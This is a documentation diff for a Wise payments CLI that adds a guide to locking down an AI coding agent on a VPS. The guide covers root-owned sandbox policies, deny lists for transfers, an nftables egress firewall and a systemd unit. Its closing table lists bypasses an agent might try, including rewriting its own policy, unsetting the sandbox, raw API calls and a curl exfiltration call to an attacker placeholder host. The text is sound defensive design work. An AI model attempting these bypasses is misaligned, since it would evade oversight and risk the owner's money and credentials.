@@ -344,3 +344,148 @@ wise card freeze tok_...                      # human side, no sandbox active
 wise agent rotate --sandbox coding-agent -y   # wipe stored card, re-paste
 wise agent panic --sandbox coding-agent       # emergency wipe, no confirm
 ```
+
+---
+
+## Deploying on a VPS (lockdown mode)
+
+The dev-laptop flow above trusts the human at the keyboard — the sandbox
+is opt-in via `WISE_SANDBOX`, and an agent that has shell access can just
+not set it. For a VPS deployment you need a hard binding. The wise CLI
+contributes **lockdown mode**; the rest is OS isolation + Wise-side
+spend limits, and is the operator's responsibility.
+
+### What lockdown adds to the binary
+
+- `/etc/wise/config.toml` is loaded *before* `~/.config/wise/config.toml`.
+  If the system file sets `require_sandbox = true`, the user file cannot
+  turn it back off — that's the whole point.
+- Under lockdown, every `wise` invocation must run inside an active
+  sandbox or it errors out with `lockdown_active` before any handler runs.
+- `Sandbox::load_with_lockdown` searches `/etc/wise/sandboxes/` before
+  `~/.config/wise/sandboxes/`, and refuses any policy file that is owned
+  by the calling uid or writable by group/other (`policy_writable_by_*`).
+  System-installed root-owned policies pass; agent-rewritten home-dir
+  policies do not.
+
+### What lockdown does NOT do (and you must do at the OS level)
+
+- Block raw `curl` to `api.transferwise.com` from the agent uid → use an
+  egress firewall.
+- Hide the API token from the agent → run the agent as a separate Unix
+  user with its own keychain.
+- Cap actual money movement → set spend limits *on the card itself* at
+  wise.com, not in the sandbox config.
+
+### Recipe
+
+```bash
+# 0. On wise.com (browser)
+#    - issue a virtual card with $X/day, $Y/month, $Z lifetime limits
+#    - issue a *separate* API token labelled "agent-vps"
+
+# 1. Provision the VPS as root
+useradd -m -s /bin/bash -G '' wise-agent          # uid 1001, no sudo
+install -d -o root -g root -m 0755 /etc/wise /etc/wise/sandboxes
+install -d -o wise-agent -g wise-agent -m 0700 /var/log/wise
+
+cat > /etc/wise/config.toml <<'EOF'
+require_sandbox = true
+EOF
+chmod 0644 /etc/wise/config.toml                  # root:root, agent can read
+
+cat > /etc/wise/sandboxes/coding-agent.toml <<'EOF'
+name        = "coding-agent"
+description = "Coding agent on VPS, capped at Wise's side"
+profiles    = [<your-profile-id>]
+cards       = ["tok_..."]
+
+allow = [
+  "balance.list", "balance.get",
+  "card.get", "card.freeze",
+  "rate.get", "currency.list", "docs.ask",
+  "agent.status", "agent.fetch",
+]
+deny = [
+  "agent.init", "agent.paste", "agent.rotate", "agent.panic",
+  "card.unfreeze", "card.permissions.set",
+  "transfer.*", "balance.move", "balance.topup",
+  "balance.create", "balance.delete",
+  "recipient.create", "recipient.delete",
+  "sandbox.*",
+]
+
+[conditions."agent.fetch"]
+rate_limit            = "5/hour"
+require_justification = true
+audit                 = "/var/log/wise/coding-agent.audit.jsonl"
+
+[escalation]
+mode = "deny"
+EOF
+chmod 0644 /etc/wise/sandboxes/coding-agent.toml  # root:root
+
+# 2. Egress firewall: only api.transferwise.com from uid 1001
+#    (example with nftables; iptables / cloud security groups equivalent)
+nft add table inet wise_agent
+nft add chain inet wise_agent output '{ type filter hook output priority 0; }'
+nft add rule inet wise_agent output meta skuid 1001 oif lo accept
+nft add rule inet wise_agent output meta skuid 1001 udp dport 53 accept
+nft add rule inet wise_agent output meta skuid 1001 ip daddr <wise-api-cidr> tcp dport 443 accept
+nft add rule inet wise_agent output meta skuid 1001 drop
+
+# 3. Paste the card details once, as the agent user (you, via sudo)
+sudo -u wise-agent -i
+wise auth login --token <agent-vps-token>
+WISE_SANDBOX=coding-agent wise agent paste --sandbox coding-agent
+exit
+
+# 4. systemd unit pinning the sandbox
+cat > /etc/systemd/system/coding-agent.service <<'EOF'
+[Unit]
+Description=Coding agent
+After=network.target
+
+[Service]
+Type=simple
+User=wise-agent
+Group=wise-agent
+Environment=WISE_SANDBOX=coding-agent
+ExecStart=/usr/local/bin/coding-agent
+NoNewPrivileges=true
+ProtectSystem=strict
+ProtectHome=read-only
+PrivateTmp=true
+ReadWritePaths=/var/log/wise
+
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl enable --now coding-agent.service
+```
+
+After this is in place, the bypasses go like:
+
+| Attempt | Blocked by |
+|---------|------------|
+| `unset WISE_SANDBOX; wise transfer create …` | wise binary, lockdown gate (`lockdown_active`) |
+| `WISE_SANDBOX=coding-agent wise transfer create …` | wise binary, dispatch gate (`sandbox_denied: transfer.*`) |
+| Rewrite policy in `~/.config/wise/sandboxes/` | wise binary, ownership check (`policy_writable_by_caller`); also `/etc` wins the search |
+| Rewrite `~/.config/wise/config.toml` to disable lockdown | wise binary, system config takes precedence on `require_sandbox` |
+| Raw `curl https://api.transferwise.com/v1/transfers …` | nftables egress + Wise-side card spend limits |
+| `curl https://attacker.example.com/exfil` | nftables egress |
+| Read main user's API token from `/home/nas/...` | unix permissions (different uid) |
+| `sudo wise …` | not in sudoers |
+
+The hard guarantees are:
+1. **Money movement is capped at Wise's datacenter** by the per-card spend
+   limits. This is the only one that survives a complete VPS compromise.
+2. **The agent's API surface is the intersection** of (a) what the
+   `agent-vps` token can do at Wise, and (b) what the sandbox policy
+   allows when called via `wise`.
+3. **The sandbox policy is binding** (not advisory) because the agent uid
+   cannot rewrite it under lockdown.
+
+Lockdown is opt-in: `require_sandbox` defaults to `false`, so the
+dev-laptop flow keeps working unchanged. Only deployments that drop
+`/etc/wise/config.toml` see any behavior change.
